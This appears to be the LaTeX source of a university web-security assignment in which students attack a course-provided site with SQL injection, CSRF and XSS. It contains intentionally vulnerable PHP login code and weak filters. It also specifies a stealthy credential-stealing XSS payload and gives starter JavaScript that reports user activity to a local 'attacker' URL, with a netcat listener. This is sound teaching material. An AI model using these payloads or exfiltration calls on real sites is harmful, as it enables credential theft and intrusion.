@@ -1,0 +1,543 @@
+%%%%%%%%%%%%%%%%
+% Set options
+
+\newcommand{\settitle}{Project 3: Web Security Pitfalls}
+\newcommand{\course}{COS432/ELE432}
+\newcommand{\coursename}{Information Security}
+\newcommand{\duedate}{Friday, November 18}
+\newcommand{\checkpointduedate}{Friday, November 11}
+\newcommand{\duetime}{12:00pm}
+\newcommand{\distdate}{November 7, 2016}
+\newcommand{\semester}{Fall 2016}
+\newcommand{\firstcheckpointpercent}{10\%}
+\newcommand{\secondcheckpointpercent}{10\%}
+\newcommand{\staffemail}{\textbf{feamster@cs.princeton.edu}}
+\newcommand{\numberingroup}{2}
+
+%%%%%%%%%%%%%%%%
+
+\documentclass[letterpaper,12pt]{report}
+\usepackage{fullpage}
+\usepackage[protrusion=true,expansion=auto]{microtype}
+\usepackage{color}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage{mathptmx}
+\usepackage{textcomp}
+\usepackage{fancyvrb}
+\usepackage{listings}
+\usepackage{paralist}
+\usepackage{url}
+\usepackage[
+  breaklinks=true,colorlinks=true,linkcolor=black,%
+  citecolor=black,urlcolor=black,bookmarks=false,bookmarksopen=false,%
+  pdfauthor={\course},%
+  pdftitle={\settitle},%
+  pdftex]{hyperref}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{multicol}
+\def\textsb#1{{\fontseries{sb}\selectfont #1}}
+\usepackage{mdframed}
+\setcounter{secnumdepth}{3}
+
+\newcommand{\problemsetdone}{\bigskip\hfill$\Box{}$}
+
+\newcommand{\htitle}
+{
+     \noindent\parbox{\textwidth}
+    {
+        \course\hfill \distdate\newline
+        \coursename\hfill 
+        \settitle \vspace*{-.5ex}\newline
+        \mbox{}\hrulefill\mbox{}
+    }
+    \vspace{8pt}
+    \begin{center}{\Large\bf{\settitle}}\end{center}
+}
+\newcommand{\handout}
+{
+    \thispagestyle{empty}
+    \markboth{}{}
+    \pagestyle{plain}
+    \htitle
+}
+
+\newcommand{\problemsetheader}
+{
+\setlength{\parindent}{0pt}
+
+This project is split into two parts, with the first checkpoint due on {\bf \checkpointduedate} at {\bf \duetime} and the second checkpoint due on {\bf \duedate} at {\bf \duetime}. We strongly recommend that you get started {\bf early}. 
+\medskip
+
+This is a group project; you SHOULD work in \textbf{teams of \numberingroup} and if you are in teams of two, you MUST submit one project per team.  Please find a partner as soon as possible.  If have trouble forming a team, post to Piazza's partner search forum.
+
+\medskip
+
+The code and other answers your group submits must be entirely your own work, and you are bound by the Honor Code.  You MAY consult with other students about the conceptualization of the project and the meaning of the questions, but you MUST NOT look at any part of someone else's solution or collaborate with anyone outside your group.  You may consult published references, provided that you appropriately cite them (e.g., with program comments), as you would in an academic paper.
+
+\medskip
+
+Solutions MUST be submitted electronically by one of the group members. Details on the filename and submission guideline is listed at the end of the document.
+
+\medskip
+
+\hrulefill
+
+\medskip
+
+}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%tool versions 
+\newcommand{\firefox}{Firefox 49}
+\newcommand{\jquery}{http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js}
+
+%Set counter for MP number
+\setcounter{chapter}{2}
+
+%domain address
+\newcommand{\bungledomain}{http://cos432-assn3.cs.princeton.edu}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{document}
+\handout
+%\setlength{\parindent}{0pt}
+\problemsetheader
+
+
+\vspace{-6pt}
+\section*{Introduction}
+In this project, we provide an insecure version of this website, and your job is to attack it by exploiting three common classes of vulnerabilities: cross-site scripting (XSS), cross-site request forgery (CSRF), and SQL~injection. You are also asked to exploit these problems with various flawed defenses in place. Understanding how these attacks work will help you better defend your own web applications.\newline
+
+\subsection*{Objectives:}
+
+\begin{itemize}
+\item Learn to spot common vulnerabilities in websites and to avoid them in your own projects.
+\item Understand the risks these problems pose and the weaknesses of naive defenses.
+\item Gain experience with web architecture and with Python's Bottle Framework, HTML, JavaScript, and SQL programming.
+\end{itemize}
+
+\section*{Guidelines}
+\begin{itemize}
+\item You SHOULD work in a group of \numberingroup.
+\item You MUST use Python, HTML, Javascript, and SQL to complete the project. You SHOULD use jQuery to complete the project.
+\item Your answers may or may not be the same as your classmates.
+\end{itemize}
+
+\smallskip
+
+\subsection*{Read this First}
+
+This project asks you to develop attacks and test them, with our permission, against a target website that we are providing for this purpose.  Attempting the same kinds of attacks against other websites without authorization is prohibited by law and university policies and may result in \emph{fines, expulsion, and jail time}.   \textbf{You must not attack any website without authorization!}  Per the course ethics policy, you are required to respect the privacy and  property rights of others at all times, \emph{or else you will fail the course.}  
+
+%\newpage
+
+\section*{General Guidelines}
+
+You SHOULD develop this project targeting \firefox, the latest version of Firefox, which you can download from \url{https://firefox.com}.  Many browsers include different client-side defenses against XSS and CSRF that will interfere with your testing.
+
+\medskip
+
+For your convenience during manual testing, we have included drop-down menus at the top of each page that let you change the CSRF and XSS defenses that are in use.  The solutions you submit must override these selections by including the \texttt{csrfdefense=\emph{n}} or \texttt{xssdefense=\emph{n}} parameter in the target URL, as specified in each task below.  You \textbf{MUST NOT} attempt to subvert the mechanism for changing the level of defense in your attacks.
+
+\medskip
+
+In all parts, you should implement the simplest attack you can think of that defeats the given set of defenses. In other words, do not simply attack the highest level of defense and submit that attack as your solution for all defenses. Also, you do not need to try to combine the vulnerabilities, except where explicitly stated below.
+
+\section*{Resources} 
+\label{sec:resources}
+
+The Firefox Web Developer tools will be a tremendous help for this project, particular the JavaScript console and debugger, DOM inspector, and network monitor.  The developer tools can be found under Tools $>$ Web Developer in Firefox.  See \url{https://developer.mozilla.org/en-US/docs/Tools}.
+
+\smallskip
+
+Although general purpose tools are permitted, you \textbf{MUST NOT} use tools that are designed to automatically test for vulnerabilities.
+
+\medskip
+
+Your solutions will involve manipulating SQL statements and writing web code using HTML, JavaScript, and the jQuery library.  Feel free to search the web for answers to basic how-to questions.  There are many fine online resources for learning these tools.  Here are a few that we recommend:
+\medskip
+
+Bottle Framework Tutorial:\\
+\url{http://bottlepy.org/docs/dev/tutorial.html} \\
+SQL Tutorial:\\
+\url{http://www.w3schools.com/sql/} \\
+SQL Statement Syntax:\\
+\url{http://dev.mysql.com/doc/refman/5.5/en/sql-syntax.html} \\
+MySQLdb API:\\
+\url{http://mysql-python.sourceforge.net/MySQLdb-1.2.2/} \\
+MySQL Connection/Python Developer Guide:\\
+\url{http://dev.mysql.com/doc/connector-python/en/} \\
+Introduction to HTML:\\ \url{https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Introduction} \\
+HTTP Made Really Easy:\\
+\url{http://www.jmarshall.com/easy/http/} \\
+JavaScript 101:\\
+\url{http://learn.jquery.com/javascript-101/} \\
+Using jQuery Core:\\ 
+\url{http://learn.jquery.com/using-jquery-core/} \\
+jQuery API Reference:\\
+\url{http://api.jquery.com} \\
+
+\bigskip
+
+To learn more about SQL Injection, XSS, and CSRF attacks, and for tips on exploiting them, see:
+\medskip
+
+\url{https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet}\\
+\url{https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet}\\
+\url{https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet}\\
+\url{https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet}\\
+
+%\newpage
+
+
+\section*{Target Website}
+\newcommand{\note}[1]{\textsl{#1}}
+\newcommand\bungle{\textsf{\bfseries{B{\scriptsize UNGLE}!}}}
+
+A startup named \bungle\ is about to launch its first product---a web search engine---but their investors are nervous about security problems.  Unlike the Bunglers who developed the site, you took CS~432/ELE~432, so the investors have hired you to perform a security evaluation before it goes live.
+
+\medskip
+
+\bungle\ is available for you to test at \textbf{\url{\bungledomain}}.
+
+\medskip
+
+The site is written in Python using the \href{http://bottlepy.org/docs/dev/index.html}{Bottle} web framework. Although Bottle has built-in mechanisms that help guard against some common vulnerabilities, the Bunglers have circumvented or ignored these mechanisms in several places.
+
+\medskip
+
+In addition to providing search results, the site accepts logins and tracks users' search histories. It stores usernames, passwords, and search history in a MySQL database.
+
+\medskip
+
+Before being granted access to the source code, you reverse engineered the site and determined that it replies to five main URLs: \texttt{/}, \texttt{/search}, \texttt{/login}, \texttt{/logout}, and \texttt{/create}.  The function of these URLs is explained below, but if you want an additional challenge, you can skip the rest of this section and do the reverse engineering yourself.
+
+\begin{description}
+	
+\item[Main page (\texttt{/})]
+	
+	The main page accepts \texttt{GET} requests and displays a search form. When submitted, this form issues a \texttt{GET} request to \texttt{/search}, sending the search string as the parameter ``\texttt{q}''.  
+	
+	If no user is logged in, the main page also displays a form that gives the user the option of logging in or creating an account.  The form issues \texttt{POST} requests to \texttt{/login} and \texttt{/create}.
+	
+	\item[Search results (\texttt{/search})]
+	
+	The search results page accepts \texttt{GET} requests and prints the search string, supplied in the ``\texttt{q}'' query parameter, along with the search results.   If the user is logged in, the page also displays the user's recent search history in a sidebar.
+	
+	{Note: Since actual search is not relevant to this project, you might not receive any results.}
+	
+	\item[Login handler (\texttt{/login})]
+	
+	The login handler accepts \texttt{POST} requests and takes plaintext ``\texttt{username}'' and ``\texttt{password}'' query parameters.  It checks the user database to see if a user with those credentials exists.  If so, it sets a login cookie and redirects the browser to the main page.  The cookie tracks which user is logged in; manipulating or forging it is \textbf{not} part of this project.
+	
+	\item[Logout handler (\texttt{/logout})]
+	
+	The logout handler accepts \texttt{POST} requests.  It deletes the login cookie, if set, and redirects the browser to the main page.
+	\smallskip
+	
+	\item[Create account handler (\texttt{/create})]
+	
+	The create account handler accepts \texttt{POST} requests and receives plaintext ``\texttt{username}'' and ``\texttt{password}'' query parameters.  It inserts the username and password into the database of users, unless a user with that username already exists.  It then logs the user in and redirects the browser to the main page.
+	
+	{Note: The password is neither sent nor stored securely; however, none of the attacks you implement should depend on this behavior.  You should choose a password that other groups will not guess, but {\bf never use an important password} to test an insecure site!}
+	
+\end{description}
+
+\newpage
+
+\section{Checkpoint 1}
+\label{sec:checkpoint_1}
+
+\subsection{SQL Injection}
+\label{sec:sql_injection}
+In this section, your goal is to demonstrate SQL injection attacks that log you in as an arbitrary user without knowing the password. Your job is to find SQL injection vulnerability for two targets. In order to protect other students' accounts, we've made a series of separate login forms for you to attack that aren't part of the main \bungle\ site.  For each of the following defenses, provide inputs to the target login form that successfully log you in as the user ``\texttt{victim}''.
+
+\subsubsection{No defenses}
+\label{sec:sql_no_defenses}
+This target does not have any protection against SQL injection. 
+The server uses the following PHP code (it is only part of the code). 
+{\vspace{-10pt}\small\begin{verbatim}
+if (isset($_POST['username']) and isset($_POST['password'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $sql_s = "SELECT * FROM users WHERE username='$username' and password='$password'";
+    $rs = mysql_query($sql_s);
+    if (mysql_num_rows($rs) > 0) {
+        echo "Login successful!";
+    } else {
+        echo "Incorrect username or password";
+    }
+}
+\end{verbatim}}
+\vspace{-10pt}
+\smallskip
+
+Target: \url{{\bungledomain/sqlinject0/}}
+
+\subsubsection{Simple escaping}
+\label{sec:sql_simple_escaping}
+The server escapes single quotes (\texttt{'}) in the inputs by replacing them with two single quotes.
+{\vspace{-10pt}\small\begin{verbatim}
+if (isset($_POST['username']) and isset($_POST['password'])) {
+    $username = str_replace("'", "''", $_POST['username']);
+    $password = str_replace("'", "''", $_POST['password']);
+    $sql_s = "SELECT * FROM users WHERE username='$username' and password='$password'";
+    $rs = mysql_query($sql_s);
+    if (mysql_num_rows($rs) > 0) {
+        echo "Login successful!";
+    } else {
+        echo "Incorrect username or password";
+    }
+}
+\end{verbatim}}
+\vspace{-10pt}
+\smallskip
+
+Target: \url{{\bungledomain/sqlinject1/}}\\
+
+\subsubsection{Escaping and Hashing}
+\label{sec:sql_md5}
+The server uses the following PHP code, which escapes the username and applies the MD5 hash function to the password. (You may get `Error in MySQL query.' with a correct pair of username and password but you can still attack it by SQL injection.)
+{\vspace{-10pt}\small\begin{verbatim}
+if (isset($_POST['username']) and isset($_POST['password'])) {
+    $username = mysql_real_escape_string($_POST['username']);
+    $hash = md5($_POST['password'], true);
+    $sql_s = "SELECT * FROM users WHERE username='$username' and passwordhash='$hash'";
+    $rs = mysql_query($sql_s);
+    if (mysql_num_rows($rs) > 0) {
+        echo "Login successful!";
+    } else {
+        echo "Incorrect username or password";
+    }
+}
+\end{verbatim}}
+\vspace{-10pt}
+
+This is more difficult than the previous two defenses.  You will need to write a program to produce a working exploit.  You can use any language you like, but we recommend C. You MUST submit source code of this program compressed in .tar.gz and the .txt file which has a solution displayed on the webpage. 
+\smallskip
+
+Target: \url{{\bungledomain/sqlinject2/}}
+
+\paragraph{What to submit} 
+\begin{enumerate}
+\item After you successfully logged in to target \url{{\bungledomain/sqlinject0/}}, copy the value you obtained from the website to {\ref{sec:sql_no_defenses}.txt}.
+\item After you successfully logged in to target \url{{\bungledomain/sqlinject1/}}, copy the value you obtained from the website to {\ref{sec:sql_simple_escaping}.txt}.
+\item After you successfully logged in to target \url{{\bungledomain/sqlinject2/}}, copy the value you obtained from the website to {\ref{sec:sql_md5}.txt}.
+\item {\ref{sec:sql_md5}.tar.gz}: Submission for \ref{sec:sql_md5} which consists of a source code for \ref{sec:sql_md5}.
+\end{enumerate}
+
+\pagebreak
+
+\subsection{Cross-site Request Forgery (CSRF)}
+\label{sec:csrf}
+
+\subsubsection{No Defenses}
+\label{sec:csrf_no_defenses}
+Your next task is to demonstrate CSRF vulnerabilities against the login form, and \bungle\ has provided two variations of their implementation for you to test.  Your goal is to construct attacks that surreptitiously cause the victim to log in to an account you control, thus allowing you to monitor the victim's search queries by viewing the search history for this account.  For each of the defenses below, create an HTML file that, when opened by a victim, logs their browser into \bungle\ under the account ``\texttt{attacker}'' and password ``\texttt{p\_13tth5x}''.\newline
+
+{Target: \url{\bungledomain/?csrfdefense=0\&xssdefense=5}}
+
+\subsubsection{Token validation}
+\label{sec:csrf_tok}
+For this target, the server uses token validation mechanism. The server sets a cookie named \texttt{csrf\_token} to a random 16-byte value and also include this value as a hidden field in the login form.  When the form is submitted, the server verifies that the client's cookie matches the value in the form.  You are allowed to exploit the XSS vulnerability to accomplish your goal.\\
+Note: Your solution MUST NOT make infinite POST requests.\\
+
+{Target: \url{\bungledomain/?csrfdefense=1\&xssdefense=0}}\\
+
+\paragraph{What to submit} 
+\begin{enumerate}
+\item {\ref{sec:csrf_no_defenses}.html}: Submission for \ref{sec:csrf_no_defenses}.
+\item {\ref{sec:csrf_tok}.html}: Submission for \ref{sec:csrf_tok}.
+\end{enumerate}
+
+Your solutions should not display evidence of an attack; the browser should just display a blank page.  (If the victim later visits Bungle, it will say ``logged in as attacker'', but that's fine for purposes of the project.  After all, most users won't immediately notice.)\\
+The HTML files you submit must be self-contained, but they may embed CSS and JavaScript.  Your files may also load jQuery from the URL \url{\jquery}.  Make sure you test your solutions by opening them as local files in \firefox. We will use this setup for grading.
+
+\medskip
+
+Note: Since you're sharing the \texttt{attacker} account with other students, we've harded coded it so the search history won't actually update.  You can test with a different account you create to see the history change.
+
+\pagebreak
+
+% CHECKPOINT II
+
+\section{Checkpoint 2}
+\label{sec:checkpoint_2}
+
+
+\subsection{Cross Site Scripting (XSS)}
+\label{sec:xss}
+
+\subsection*{Attacking Bungle}
+Your final goal is to demonstrate XSS attacks against the \bungle\ search box, which does not properly filter search terms before echoing them to the results page.  For each of the defenses below, your goal is to construct a URL that, if loaded in the victim's browser, correctly executes the payload specified below.  We recommend that you begin by testing with a simple payload (e.g., \texttt{alert(0);}), then move on to the full payload.  Note that you should be able to implement the payload once, then use different means of encoding it to bypass the different defenses.
+
+\subsection*{Payload}
+The payload (the code that the attack tries to execute) will be an extended form of spying and password theft.  After the victim visits the URL you create, all functions of the \bungle\ site should be under control of your code and should report what the user is doing to a server you control, until the user leaves the site.  Your payload needs to accomplish these goals:
+\bigskip
+
+\noindent\textbf{Stealth:}
+\begin{itemize}
+\item Display all pages correctly, with no significant evidence of attack.\\
+(Minor text formatting glitches are acceptable. Also you can assume the user {\bf will never click} the items in `Search History'. )
+\item Display normal URLs in the browser's location bar, with no evidence of attack.\\
+(Hint: Learn about the HTML5 History API.)
+\item Hide evidence of attack in the \bungle\ search history view, as long as your code is running.
+\end{itemize}
+
+\noindent\textbf{Persistence:}
+\begin{itemize}
+\item Continue the attack if the user navigates to another page on the site by following a link or submitting a form, including by logging in or logging out.  (Your code does \textbf{not} have to continue working if the user's actions trigger an error that isn't the fault of your code.)
+\item Continue the attack if the user navigates to another \bungle\ page by using the browser's back or forward buttons.
+\end{itemize}
+
+\noindent\textbf{Spying:}
+\begin{itemize}
+\item Report all login and logout events by loading the URLs:\\
+\texttt{http://127.0.0.1:31337/stolen?event=login\&user=<username>\&pass=<password>}\\
+\texttt{http://127.0.0.1:31337/stolen?event=logout\&user=<username>}
+
+You can test receiving this data on your local machine by using Netcat: \texttt{\$ nc -l 31337}
+
+\item Report each page that is displayed (what the user thinks they're seeing) by loading the URL:\\
+\texttt{http://127.0.0.1:31337/stolen?event=nav\&user=<username>\&url=<encoded\_url>}\\
+(\texttt{<username>} should be omitted if no user is logged in.)
+\end{itemize}
+
+
+\subsection*{Defenses} 
+
+There are five levels of defense.  In each case, you SHOULD submit the simplest attack you can find that works against that defense; you SHOULD NOT simply attack the highest level and submit your solution for that level for every level. Try to use a different technique for each defense.  The Python code that implements each defense is shown below, along with the target URL.
+
+\subsubsection{Warm up}
+\label{sec:xss_warm_up}
+To get you comfortable with the concept of XSS, we setup a dummy website for you to work with.  The website accept a single GET parameter \texttt{name} that is vulnerable to XSS attack.  Your goal is to change the "Click me" link to redirect the victim to \url{http://ee.princeton.edu/}.\\\\
+Target: \url{\bungledomain/multivac/}
+
+\subsubsection{No defenses}
+\label{sec:xss_1}
+Target: \url{\bungledomain/search?xssdefense=0}\\
+\smallskip
+
+Also submit a human readable version of the code you use to generate your URL for \ref{sec:xss_1}, as a file named \ref{sec:xss_1}\_payload.html.
+
+\subsubsection{\textbf{Remove ``script''}}
+\label{sec:xss_2}
+\verb+filtered = re.sub(r"(?i)script", "", input)+
+\smallskip
+
+Target: \url{\bungledomain/search?xssdefense=1}\\
+
+\subsubsection{\textbf{Recursively removing ``script''}}
+\label{sec:xss_3}
+A function shown below filters the user input.
+
+\begin{mdframed}
+\begin{Verbatim}
+def filter(input):
+    original = input
+    filtered = re.sub(r"(?i)script", "", input)
+    while original != filtered:
+        original = filtered
+        filtered = re.sub(r"(?i)script", "", original)
+    return filtered
+\end{Verbatim}
+\end{mdframed}
+\smallskip
+
+Target: \url{\bungledomain/search?xssdefense=2}\\
+
+\subsubsection{\textbf{Recursively Removing several tags}}
+\label{sec:xss_4}
+Likewise, a function filter(input) filters the user input.
+
+\begin{mdframed}
+\begin{Verbatim}
+def filter(input):
+    original = input
+    filtered = re.sub(r"(?i)script|<img|<body|<style|<meta|<embed|<object"
+                              "", input)
+    while original != filtered:
+        original = filtered
+        filtered = re.sub(r"(?i)script|<img|<body|<style|<meta|<embed|<object"
+                          "", original)
+    return filtered
+\end{Verbatim}
+\end{mdframed}
+\smallskip
+
+Target: \url{\bungledomain/search?xssdefense=3}\\
+
+
+%\subsubsection{\textbf{Remove some punctuation (You don't need to do this problem)}}
+%\label{sec:xss_5}
+%\verb+filtered = re.sub(r"[;'\"]", "", input)+
+%\smallskip
+
+%Target: \url{\bungledomain/search?xssdefense=4}\\
+
+\paragraph{What to submit}
+\begin{enumerate}
+\item Submission the URL for \ref{sec:xss_warm_up} to {\ref{sec:xss_warm_up}.txt}. 
+\item Submit the URL for {\ref{sec:xss_1}} to {\ref{sec:xss_1}.txt} and the payload for creating the URL to {\ref{sec:xss_1}\_payload.html}.
+\item Submit the URL for \ref{sec:xss_2} in {\ref{sec:xss_2}.txt}.
+\item Submit the URL for {\ref{sec:xss_3}} in {\ref{sec:xss_3}.txt}.
+\item Submit the URL for {\ref{sec:xss_4}} in {\ref{sec:xss_4}.txt}.
+%\item Submit the URL for {\ref{sec:xss_5}} in {\ref{sec:xss_5}.txt}.
+\end{enumerate}
+
+Your submission for each level of defense will be a text file with the specified filename that contains a single line consisting of a URL.  When this URL is loaded in a victim's browser, it should execute the specified payload against the specified target. The payload encoded in your URLs must be self-contained, but they may embed CSS and JavaScript.  Your payload may also load jQuery from the URL \url{\jquery}.  Make sure you test your solutions in \firefox, the browser we will use for grading.
+
+\newpage
+
+\subsection*{Framework Code}
+You may build your XSS attacks by extending the following framework if you wish. (It simply changes the content in the search bar.)
+
+{\small\begin{verbatim}
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+    function log(data) { 
+        console.log($.param(data))
+        $.get(attacker, data);
+    }
+    function proxy(href) {
+        var stateObj = { foo: href };
+        history.pushState(stateObj, "page 2", href);
+        $("html").load(href, function(){
+            $("html").show();
+            log({event: "nav", uri: href});
+            $("#query").val("pwned!");
+        }); 
+    }
+    $("html").hide();
+    proxy("/");
+}
+	
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "/search?xssdefense=" + xssdefense.toString() + "&q=" + 
+            encodeURIComponent("<script" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</script" + ">");
+    } else {
+        // Implement code to defeat XSS defenses here.
+    }
+}
+	
+var xssdefense = 0;
+var target = "http://cos432-assn3.cs.princeton.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+</script>
+<h3></h3>
+\end{verbatim}}
+
+\end{document}
